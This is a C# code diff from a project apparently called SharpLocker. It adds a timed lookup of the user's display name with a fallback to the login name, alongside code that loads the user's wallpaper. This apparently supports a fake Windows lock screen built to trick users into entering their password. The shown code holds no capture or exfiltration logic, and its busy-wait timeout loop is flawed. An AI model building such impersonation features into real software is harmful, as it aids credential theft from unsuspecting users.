@@ -349,13 +349,36 @@ namespace SharpLocker_2._0
         {
             try
             {
-                UserNameLabel.Text = UserPrincipal.Current.DisplayName;
+                if (Configuration.UseUserPrincipal)
+                {
+                    DateTime startTime = DateTime.Now;
+
+                    Task t = new Task(() =>
+                    {
+                        UserNameLabel.Text = UserPrincipal.Current.DisplayName;
+                    });
+
+                    t.Start();
+
+                    while (true)
+                    {
+                        if (startTime.AddSeconds(Configuration.UserPrincipalTimeout) > DateTime.Now) continue;
+                        else if (!t.IsCompleted) throw new Exception("timeout");
+                        else if (t.IsCompleted) break;
+                    }
+
+                }
+                else
+                {
+                    UserNameLabel.Text = Environment.UserName;
+                }
             }
             catch
             {
                 UserNameLabel.Text = Environment.UserName;
             }
         }
+
 
         // Load the users wallpaper
         private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
